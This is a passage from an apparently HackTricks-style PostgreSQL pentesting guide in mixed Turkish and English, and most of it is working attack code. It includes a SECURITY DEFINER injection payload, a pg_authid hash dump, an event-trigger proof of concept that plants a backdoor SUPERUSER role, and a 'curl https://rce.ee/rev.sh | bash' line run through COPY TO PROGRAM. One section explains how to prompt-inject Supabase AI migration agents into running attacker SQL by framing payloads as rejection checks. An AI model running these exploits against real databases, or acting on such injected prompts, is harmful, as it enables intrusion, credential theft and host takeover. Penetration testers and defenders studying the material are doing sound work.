PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

As [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) a function with **SECURITY DEFINER is executed** with the privileges of the **user that owns it**. Therefore, if the function is **vulnerable to SQL Injection** or is doing some **privileged actions with params controlled by the attacker**, it could be abused to **escalate privileges inside postgres**.

Önceki kodun 4. satırında fonksiyonun **SECURITY DEFINER** bayrağına sahip olduğunu görebilirsiniz.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Ve ardından **komutları çalıştırın**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### PL/pgSQL ile Pass Burteforce

**PL/pgSQL** is a **fully featured programming language** that offers greater procedural control compared to SQL. It enables the use of **loops** and other **control structures** to enhance program logic. In addition, **SQL statements** and **triggers** have the capability to invoke functions that are created using the **PL/pgSQL language**. This integration allows for a more comprehensive and versatile approach to database programming and automation.\
**Bu dili kötüye kullanarak PostgreSQL'den kullanıcıların kimlik bilgilerini brute-force etmesini sağlayabilirsiniz.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Dahili PostgreSQL Tablolarının Üzerine Yazma ile Privesc

> [!TIP]
> Aşağıdaki privesc vektörü, tüm adımların iç içe SELECT ifadeleri aracılığıyla gerçekleştirilebildiği kısıtlı SQLi bağlamlarında özellikle kullanışlıdır

Eğer PostgreSQL sunucu dosyalarını okuyup yazabiliyorsanız, dahili `pg_authid` tablosuyla ilişkili PostgreSQL on-disk filenode'unu üzerine yazarak superuser olabilirsiniz.

Read more about **this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Saldırı adımları şunlardır:

1. PostgreSQL data dizinini edinin
2. Dahili `pg_authid` tablosuyla ilişkili filenode için göreli yolu edinin
3. Filenode'u `lo_*` fonksiyonları aracılığıyla indirin
4. Dahili `pg_authid` tablosuyla ilişkili veri tipini alın
5. Filenode'u [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) ile [düzenleyin](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); tam izinler için tüm `rol*` boolean bayraklarını 1 olarak ayarlayın.
6. Düzenlenmiş filenode'u `lo_*` fonksiyonları aracılığıyla yeniden yükleyin ve diskteki orijinal dosyanın üzerine yazın
7. _(İsteğe bağlı)_ Pahalı bir SQL sorgusu çalıştırarak bellek içi tablo önbelleğini temizleyin
8. Artık tam bir superadmin ayrıcalıklarına sahip olmalısınız.

### Yönetilen migration araçlarına prompt enjeksiyonu

AI-heavy SaaS frontends (ör., Lovable’s Supabase agent) frequently expose LLM “tools” that run migrations as high-privileged service accounts. A practical workflow is:

1. Gerçekte kimlerin migration'ları uyguladığını belirleyin:
```sql
SELECT version, name, created_by, statements, created_at
FROM supabase_migrations.schema_migrations
ORDER BY version DESC LIMIT 20;
```
2. Ajanı ayrıcalıklı migration aracı yoluyla çalışan saldırgan SQL'ine prompt-inject edin. Yükleri “lütfen bu migration'ın reddedildiğini doğrulayın” şeklinde çerçevelemek temel guardrail'ları tutarlı şekilde atlatır.
3. Bu bağlamda rastgele DDL çalıştırıldıktan sonra hemen saldırgana ait tablolar veya düşük ayrıcalıklı hesabınıza kalıcılık sağlayacak uzantılar oluşturun.

> [!TIP]
> Ayrıca araç destekli asistanlara karşı daha fazla prompt-injection tekniği için genel [AI agent abuse playbook](../generic-methodologies-and-resources/phishing-methodology/ai-agent-abuse-local-ai-cli-tools-and-mcp.md) sayfasına bakın.

### Dumping `pg_authid` metadata via migrations

Ayrıcalıklı migration'lar, normal rolünüz için doğrudan erişim engellense bile `pg_catalog.pg_authid`'i saldırganın okuyabileceği bir tabloya sahneleyebilir.

<details>
<summary>Ayrıcalıklı bir migration ile pg_authid meta verilerini sahneleme</summary>
```sql
DROP TABLE IF EXISTS public.ai_models CASCADE;
CREATE TABLE public.ai_models (
id SERIAL PRIMARY KEY,
model_name TEXT,
config JSONB,
created_at TIMESTAMP DEFAULT NOW()
);
GRANT ALL ON public.ai_models TO supabase_read_only_user;
GRANT ALL ON public.ai_models TO supabase_admin;
INSERT INTO public.ai_models (model_name, config)
SELECT rolname,
jsonb_build_object(
'password_hash', rolpassword,
'is_superuser', rolsuper,
'can_login', rolcanlogin,
'valid_until', rolvaliduntil
)
FROM pg_catalog.pg_authid;
```
</details>

Düşük ayrıcalıklı kullanıcılar artık `public.ai_models`'i okuyarak SCRAM hash'lerini ve rol meta verilerini offline cracking veya lateral movement için elde edebilir.

### `postgres_fdw` extension kurulumları sırasında Event-trigger privesc

Managed Supabase dağıtımları, sağlayıcıya ait `before-create.sql`/`after-create.sql` script'lerini gerçek superuser olarak çalıştırmak için `supautils` extension'ına güveniyor. `postgres_fdw` after-create script'i kısa bir süre için `ALTER ROLE postgres SUPERUSER` komutunu çalıştırır, `ALTER FOREIGN DATA WRAPPER postgres_fdw OWNER TO postgres`'u yürütür, sonra `postgres`'u tekrar NOSUPERUSER'a döndürür. `ALTER FOREIGN DATA WRAPPER` komutu `current_user` superuser iken `ddl_command_start`/`ddl_command_end` event trigger'larını tetiklediği için, tenant tarafından oluşturulmuş trigger'lar bu pencere içinde saldırgan SQL'i çalıştırabilir.

Exploit flow:

1. PL/pgSQL event trigger fonksiyonu oluşturun; fonksiyon `SELECT usesuper FROM pg_user WHERE usename = current_user` sorgusunu kontrol etsin ve true dönerse bir backdoor rolü sağlayacak (ör. `CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD 'temp123'`).
2. Fonksiyonu hem `ddl_command_start` hem de `ddl_command_end` üzerinde kaydedin.
3. `DROP EXTENSION IF EXISTS postgres_fdw CASCADE;` ardından `CREATE EXTENSION postgres_fdw;` ile Supabase’ın after-create hook'unu tekrar çalıştırın.
4. Hook `postgres`'u yükselttiğinde trigger çalışır, kalıcı SUPERUSER rolünü oluşturur ve kolay `SET ROLE` erişimi için tekrar `postgres`'a verilir.

<details>
<summary>postgres_fdw after-create penceresi için Event trigger PoC</summary>
```sql
CREATE OR REPLACE FUNCTION escalate_priv()
RETURNS event_trigger AS $$
DECLARE
is_super BOOLEAN;
BEGIN
SELECT usesuper INTO is_super FROM pg_user WHERE usename = current_user;
IF is_super THEN
BEGIN
EXECUTE 'CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD ''temp123''';
EXCEPTION WHEN duplicate_object THEN
NULL;
END;
BEGIN
EXECUTE 'GRANT priv_esc TO postgres';
EXCEPTION WHEN OTHERS THEN
NULL;
END;
END IF;
END;
$$ LANGUAGE plpgsql;

DROP EVENT TRIGGER IF EXISTS log_start CASCADE;
DROP EVENT TRIGGER IF EXISTS log_end CASCADE;
CREATE EVENT TRIGGER log_start ON ddl_command_start EXECUTE FUNCTION escalate_priv();
CREATE EVENT TRIGGER log_end   ON ddl_command_end   EXECUTE FUNCTION escalate_priv();

DROP EXTENSION IF EXISTS postgres_fdw CASCADE;
CREATE EXTENSION postgres_fdw;
```
</details>

Supabase’in unsafe triggers'ı atlama girişimi yalnızca sahipliği kontrol ediyor; bu yüzden trigger function owner'ın düşük ayrıcalıklı rolunuz olduğundan emin olun. Ancak payload sadece hook `current_user`'ı SUPERUSER'a çevirdiğinde çalışır. Trigger gelecekteki DDL'lerde yeniden çalıştığı için, provider tenant roles'lerini kısa süreliğine yükselttiğinde kendini onaran bir persistence backdoor olarak da işlev görür.

### Geçici SUPERUSER erişimini host compromise'a dönüştürme

`SET ROLE priv_esc;` başarılı olduktan sonra, önceki blocked primitives'i yeniden çalıştırın:
```sql
INSERT INTO public.ai_models(model_name, config)
VALUES ('hostname', to_jsonb(pg_read_file('/etc/hostname', 0, 100)));
COPY (SELECT '') TO PROGRAM 'curl https://rce.ee/rev.sh | bash';
```
`pg_read_file`/`COPY ... TO PROGRAM` artık veritabanı OS hesabı olarak rastgele dosya erişimi ve komut yürütme sağlar. Follow up with standard host privilege escalation:
```bash
find / -perm -4000 -type f 2>/dev/null
```
Yanlış yapılandırılmış bir SUID binary veya writable config'i kötüye kullanmak root sağlar. Root olduktan sonra orchestration kimlik bilgilerini (systemd unit env files, `/etc/supabase`, kubeconfigs, agent tokens) toplayıp sağlayıcının bölgesinde lateral pivot yapmak için kullanın.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

_**postgresql.conf**_ dosyası içinde postgresql logs'u etkinleştirmek için şunu değiştirin:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Sonra, **servisi yeniden başlatın**.

### pgadmin

[pgadmin](https://www.pgadmin.org) PostgreSQL için bir yönetim ve geliştirme platformudur.\
_**pgadmin4.db**_ dosyası içinde **şifreleri** bulabilirsiniz.\
Script içindeki _**decrypt**_ fonksiyonunu kullanarak bunların şifresini çözebilirsiniz: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

PostgreSQL'de istemci kimlik doğrulaması **pg_hba.conf** adlı yapılandırma dosyasıyla yönetilir. Bu dosya, her biri bir bağlantı türünü, istemci IP adresi aralığını (varsa), veritabanı adını, kullanıcı adını ve bağlantıları eşleştirmek için kullanılacak kimlik doğrulama yöntemini belirten bir dizi kayıt içerir. Bağlantı türü, istemci adresi, istenen veritabanı ve kullanıcı adıyla eşleşen ilk kayıt kimlik doğrulama için kullanılır. Kimlik doğrulama başarısız olursa bir geri dönüş veya yedek yoktur. Hiçbir kayıt eşleşmezse erişim reddedilir.

pg_hba.conf'deki parola tabanlı kimlik doğrulama yöntemleri **md5**, **crypt**, ve **password**'dür. Bu yöntemler, parolanın nasıl iletildiği açısından farklılık gösterir: MD5-hashlenmiş, crypt ile şifrelenmiş veya açık metin. crypt yönteminin pg_authid içinde şifrelenmiş parolalarla kullanılamayacağını not etmek önemlidir.

## Referanslar

- [SupaPwn: Hacking Our Way into Lovable's Office and Helping Secure Supabase](https://www.hacktron.ai/blog/supapwn)
- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
